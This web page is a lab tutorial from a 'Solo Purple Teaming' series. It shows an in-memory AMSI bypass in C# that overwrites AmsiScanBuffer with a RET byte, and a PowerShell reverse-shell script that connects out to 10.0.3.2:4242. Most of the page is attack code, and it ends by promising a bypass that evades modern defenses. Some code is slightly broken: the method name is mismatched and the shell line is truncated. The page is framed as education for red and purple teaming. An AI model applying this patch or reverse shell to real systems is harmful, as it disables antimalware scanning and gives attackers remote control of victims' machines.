---
layout: default
title: "When Patching Does Not Go As Planned"
permalink: /solo-purple-teaming/when-patching-does-not-go-as-planned/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>When Patching Does Not Go As Planned</h1>
</section>
<section class="spt-content">
<h2 id="dart-introduction">🎯 Introduction</h2>
<p>In cybersecurity, there is a continuous cat-and-mouse game between
offensive and defensive strategies. Every evasion method, including AMSI
bypasses, has a limited shelf life. Once an evasion technique becomes
public, security vendors rapidly analyze it and implement
countermeasures.</p>
<p>Understanding <strong>how</strong> these techniques work is
essential—not just replicating them. In this lab, you'll learn how to
perform an AMSI bypass in memory using C#, and more importantly, how to
adapt your evasion strategy as defenses evolve.</p>
<blockquote>
<p>⚠️ This lab is for educational purposes only. All demonstrations
should remain within controlled environments. Ethical disclosure of new
bypasses is essential to strengthening collective security.</p>
</blockquote>
<hr />
<h2 id="test_tube-lab-objective">🧪 Lab Objective</h2>
<ul>
<li>Load <code>amsi.dll</code> into memory.</li>
<li>Locate and patch the <code>AmsiScanBuffer</code> function.</li>
<li>Overwrite the function with a <code>RET</code> instruction to
disable AMSI scanning.</li>
<li>Restore original memory protections.</li>
<li>Demonstrate detection by Defender.</li>
</ul>
<hr />
<h2 id="desktop_computer-setting-up-the-environment">🖥️ Setting Up the
Environment</h2>
<blockquote>
<p>"I'm currently logged into my reverse engineering VM with the
AttachDebugger C# project open."</p>
</blockquote>
<p>We begin by importing unmanaged functions from
<code>kernel32.dll</code> that we need to manipulate memory.</p>
<h3 id="jigsaw-dll-imports">🧩 DLL Imports</h3>
<ul>
<li><code>GetProcAddress</code> locates the memory address of a target
function.</li>
<li><code>VirtualProtect</code> changes memory permissions to allow
patching.</li>
</ul>
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

<hr />
<h2 id="wrench-writing-the-patch-function">🔧 Writing the Patch
Function</h2>
<h3 id="c--patch-method">C# – <code>Patch()</code> Method</h3>
static void Patch()
{
    Process thisProcess = Process.GetCurrentProcess();

    foreach (ProcessModule module in thisProcess.Modules)
    {
        if (module.ModuleName.Equals("amsi.dll", StringComparison.OrdinalIgnoreCase))
        {
            IntPtr pointer = GetProcAddress(module.BaseAddress, "AmsiScanBuffer");
            uint oldProtect;
            bool success = VirtualProtect(pointer, (UIntPtr)0x1, 0x40, out oldProtect);
            if (success)
            {

            byte[] fix = new byte[] { 0xC3 };
            Marshal.Copy(fix, 0, pointer, fix.Length);
            success=VirtualProtect(pointer, (UIntPtr)0x1, oldProtect, out oldProtect);
            }
        }
    }
}

<hr />
<h2 id="gear-triggering-amsi-load-safely">⚙️ Triggering AMSI Load
Safely</h2>
<blockquote>
<p>"AMSI is not loaded when the app starts. It loads only when
PowerShell executes."</p>
</blockquote>
<p>We want to avoid loading a malicious payload too early. Instead, use
a safe PowerShell command to trigger AMSI loading.</p>
<h3 id="powershell-trigger">PowerShell Trigger</h3>
static void Main(string[] args)
{
    Console.ReadLine();
    PowerShell ps = PowerShell.Create();
    string script = "whoami"; 
    ps.AddScript(script)
    Collection<PSObject> results = ps.Invoke();
    
    foreach (PSObject obj in results)
    {    
        Console.WriteLine(obj.ToString());
    }
    patch();
    Console.ReadLine();
    script = "$client = New-Object System.Net.Sockets.TCPClient('10.0.3.2',4242);$stream = $client.GetStream();[byte[]]$byte
    ps.AddScript(script);
    results = ps.Invoke();
    
    foreach (PSObject obj in results)
    {
        Console.WriteLine(obj.ToString());
    }

<hr />
<h2 id="test_tube-execution-steps">🧪 Execution Steps</h2>
<ol type="1">
<li><p>Open a terminal and run the commands below:</p>
cd source/repos/AttachDebuggerTest/AttachDebuggerTest/bin/x64/Debug
AttachDebuggerTest.exe
</li>
<li><p>Open <strong>System Informer</strong> (or Process
Hacker).</p></li>
</ol>
<p><img src="/assets/images/solo-purple-teaming/when-patching-does-not-go-as-planned/image.png"
alt="image.png" /></p>
<p>As seen above: <code>amsi.dll</code> is <strong>not loaded</strong>
initially.</p>
<ol type="1">
<li>Run the script. AMSI will now be loaded.</li>
</ol>
<p><img
src="/assets/images/solo-purple-teaming/when-patching-does-not-go-as-planned/image%201.png"
alt="image.png" /></p>
<ol type="1">
<li>The patch executes, attempting to overwrite
<code>AmsiScanBuffer</code>.</li>
</ol>
<hr />
<h2 id="rotating_light-defender-detection">🚨 Defender Detection</h2>
<blockquote>
<p>"Defender just blocked our patch."</p>
</blockquote>
<p><img
src="/assets/images/solo-purple-teaming/when-patching-does-not-go-as-planned/image%202.png"
alt="image.png" /></p>
<p>After running the patch:</p>
<ul>
<li>Open <strong>Windows Security</strong> → <strong>Protection
History</strong>.</li>
<li>Notice how the patching behavior was detected.</li>
</ul>
<p><img
src="/assets/images/solo-purple-teaming/when-patching-does-not-go-as-planned/image%203.png"
alt="image.png" /></p>
<blockquote>
<p>This demonstrates that while the technique works in theory, it has
been fingerprinted by Defender.</p>
</blockquote>
<hr />
<h2 id="pushpin-key-takeaways">📌 Key Takeaways</h2>
<ul>
<li>Every bypass has a lifecycle. This one has been flagged by modern
EDRs.</li>
<li>You must understand <strong>why</strong> the technique works to
adapt and innovate.</li>
<li>Always expect that today's working patch may fail tomorrow.</li>
</ul>
<hr />
<h2 id="arrows_counterclockwise-coming-up-next-evasion-techniques">🔄
Coming Up Next: Evasion Techniques</h2>
<blockquote>
<p>In our next lecture, we’ll dive into detection evasion.</p>
</blockquote>
<p>Topics to explore:</p>
<ul>
<li>Payload obfuscation</li>
<li>Indirect memory patching</li>
<li>Inline hook evasion</li>
</ul>
<blockquote>
<p>"Evasion is a discipline. It takes persistence, creativity, and
ethical responsibility."</p>
</blockquote>
<p>Be ready to build a fully functioning AMSI bypass that can evade
modern defenses. See you in the next lab!</p>
</section>
</div>
